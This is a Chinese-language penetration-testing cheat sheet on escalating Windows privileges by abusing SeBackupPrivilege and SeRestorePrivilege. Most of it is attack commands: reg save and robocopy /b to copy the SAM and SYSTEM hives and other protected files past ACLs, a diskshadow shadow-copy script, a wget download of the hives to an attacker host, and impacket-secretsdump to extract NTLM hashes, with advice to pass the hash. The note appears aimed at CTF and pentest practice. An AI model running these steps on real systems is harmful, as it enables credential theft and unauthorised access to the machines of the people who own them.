---
cmd_type: PrivEsc
os: windows
tags:
  - cmd
syntax: whoami /priv
---

# SeBackup-SeRestore 提权

## 适用场景

- `whoami /priv` 显示当前用户具有 `SeBackupPrivilege` / `SeRestorePrivilege`。
- 目标是导出 SAM/SYSTEM 拿 hash、或读取任意文件绕过 ACL 窃取敏感数据。
- 常见于备份服务账号（Backup Operators 组、某些数据库/备份软件运行账号）。

## 枚举命令

```bash
whoami /priv                        # 查看特权（找 SeBackupPrivilege / SeRestorePrivilege）
whoami /groups                      # 查看是否在 Backup Operators 组
net user <USER>                     # 查看用户所属组
icacls C:\Windows\System32\config   # 查看 SAM/SYSTEM 目录 ACL
```

## 利用步骤

### 1. 确认特权

`whoami /priv` 输出含以下条目即为可用：

```text
SeBackupPrivilege   Back up files and directories   Disabled
SeRestorePrivilege  Restore files and directories   Disabled
```

### 2. 导出 SAM 与 SYSTEM（reg save）

```bash
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
# 用特权账号导出时无需管理员
```

### 3. 下载到攻击机并 dump hash

```bash
# 目标机起 HTTP 或攻击机起下载
# 攻击机下载
wget http://<IP>:8000/SAM -O SAM
wget http://<IP>:8000/SYSTEM -O SYSTEM
# impacket 离线提取本地账户 hash（含 Administrator NTLM）
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### 4. robocopy /b 绕过 ACL 读文件

```bash
# /b 以备份模式复制，绕过文件系统 ACL，可直接读 SAM 等受保护文件
robocopy /b C:\Windows\System32\config C:\Windows\Temp\config SAM SYSTEM
# 读任意受限文件（如 web.config、密码文件）
robocopy /b C:\inetpub\wwwroot C:\Windows\Temp\www web.config
# 或直接用 powershell 以 SeBackup 读文件
robocopy /b C:\Users\<USER>\Desktop C:\Windows\Temp\dump flag.txt
```

### 5. diskshadow（VSS 卷影拷贝，提一句）

```bash
# 通过 VSS 创建卷影副本，从副本读 SAM/SYSTEM，规避 ACL
diskshadow /s script.txt
# script.txt 内容示例：
#   set context persistent nowriters
#   add volume c: alias backup
#   create
#   expose %backup% z:
# 之后从 Z:\Windows\System32\config 复制 SAM/SYSTEM
```

## 常见坑

- 特权显示 `Disabled` 不代表不能用，SeBackup/SeRestore 默认就是 Disabled 状态但仍可生效。
- `reg save` 需要 `HKLM` 下可写导出目录，用 `C:\Windows\Temp` 或当前用户可写路径，别直接写 `C:\`。
- secretsdump 的 `LOCAL` 模式提取的是本地 SAM 账户；域账户 hash 需要域控制器上的 NTDS。
- robocopy 的 `/b` 仅在具备 SeBackupPrivilege 时才真正绕过 ACL，普通用户加 `/b` 会失败。
- 拿到 hash 后优先 Pass-the-Hash 登录，避免破解密码消耗时间。

## 参考开源项目

- impacket — https://github.com/fortra/impacket
- LOLBAS — https://lolbas-project.github.io/
